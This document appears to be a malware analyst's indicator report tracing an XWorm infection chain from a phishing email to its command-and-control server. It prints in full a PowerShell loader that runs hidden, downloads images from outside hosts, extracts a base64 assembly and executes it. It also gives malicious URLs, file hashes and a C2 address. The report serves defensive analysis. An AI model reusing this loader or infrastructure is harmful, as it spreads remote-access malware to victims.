THREAT IDENTIFICATION: XWORM 

EMAIL SUBJECT
Payment receipt..

EMAIL SENDER
Grady@servicecompressorparts.com

INITIAL DOWNLOAD URL
http://castorndpollux.com/R9283762154.zip

ZIP FILE HASH
R9283762154.zip
d03bfc8079284f50346ade38cf5cc09b

IMG FILE HASH
R9283762154.IMG
99c766f0bad650818f972807f37228ba

WSF FILE HASH
R9283762154.wsf
8e047f6425b7cea3bcbaa0f78f5f7e14

PASTEBIN POWERSHELL SCRIPT DOWNLOAD
https://pastebin.com/raw/Q587VyxQ

POWERSHELL FILE HASH
Q587VyxQ
bb49fdb138172415017113cb88851380

INTERCEPTED POWERSHELL
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -windowstyle hidden -executionpolicy bypass -Noprofile -command "function DownloadDataFromLinks { param ([string[]]$links) $webClient = New-Object System.Net.WebClient; $downloadedData = @(); $shuffledLinks = $links | Get-Random -Count $links.Length; foreach ($link in $shuffledLinks) { try { $downloadedData += $webClient.DownloadData($link) } catch { continue } }; return $downloadedData }; $links = @('https://uploaddeimagens.com.br/images/004/760/043/full/new_image.jpg?1711287887', 'https://uploaddeimagens.com.br/images/004/760/044/original/new_image.jpg?1711287888'); $imageBytes = DownloadDataFromLinks $links; if ($imageBytes -ne $null) { $imageText = [System.Text.Encoding]::UTF8.GetString($imageBytes); $startFlag = '<<BASE64_START>>'; $endFlag = '<<BASE64_END>>'; $startIndex = $imageText.IndexOf($startFlag); $endIndex = $imageText.IndexOf($endFlag); if ($startIndex -ge 0 -and $endIndex -gt $startIndex) { $startIndex += $startFlag.Length; $base64Length = $endIndex - $startIndex; $base64Command = $imageText.Substring($startIndex, $base64Length); $commandBytes = [System.Convert]::FromBase64String($base64Command); $loadedAssembly = [System.Reflection.Assembly]::Load($commandBytes); $type = $loadedAssembly.GetType('PROJETOAUTOMACAO.VB.Home'); $method = $type.GetMethod('VAI').Invoke($null, [object[]] ('txt.orwxcram/KJ/moc.kahtebnasik//:sptth' , '1' , 'C:\Windows\Temp\' , 'NameWsf','RegAsm',''))} }"

DOWNLOAD URLS
https://uploaddeimagens.com.br/images/004/760/043/full/new_image.jpg?1711287887
https://uploaddeimagens.com.br/images/004/760/044/original/new_image.jpg?1711287888

JPG FILE HASHES
new_image.jpg@1711287887
f48bc3d4ae14d039e9577aefbd64a680

new_image.jpg@1711287888
028bc57d1f0094ff86b87f63bf6cc11f

EXECUTABLE EXTRACTED FROM THE SECOND JPG FILE (ERROR ON LAUNCH)
Stego_download_large.exe
2b66afaca35f9d8c6f0939960dcf57b1

REVERSED URL CONTAINING ENCODED PAYLOAD
txt.orwxcram/KJ/moc.kahtebnasik//:sptth

which reverses to:
https://kisanbethak.com/JK/marcxwro.txt
The contents of this file are also reversed and convert to a base64 executable. 

TEXT FILE HASH
marcxwro.txt
fd54be87b82b97c146b7e1c2e1b60bc2

CONVERTED BINARY FILE HASH (XWORM BINARY)
download.exe
36e7985a6c7c83dc5be87f812eac7978

TRAFFIC OBSERVED FROM REGASM.EXE TO C2
194.147.140.138:9090
marxrwonew9090.duckdns.org

STRINGS FROM MEMORY
INFO<Xwormmm>C360AFC3D868F7C1C1AF<Xwormmm>analyst<Xwormmm> Windows 10 Pro for Workstations 64bit<Xwormmm>XWorm V3.1<Xwormmm>02/04/2024<Xwormmm>False<Xwormmm>False<Xwormmm>False<Xwormmm>Windows D
XWorm V3.1
<Xwormmm>C360AFC3D868F7C1C1AF<Xwormmm>analyst<Xwormmm> Windows 10 Pro for Workstations 64bit<Xwormmm>XWorm V3.1<Xwormmm>02/04/2024<Xwormmm>False<Xwormmm>False<Xwormmm>False<Xwormmm>Windows Defender
PING!<Xwormmm>Results - download.exe (3180)<Xwormmm>0


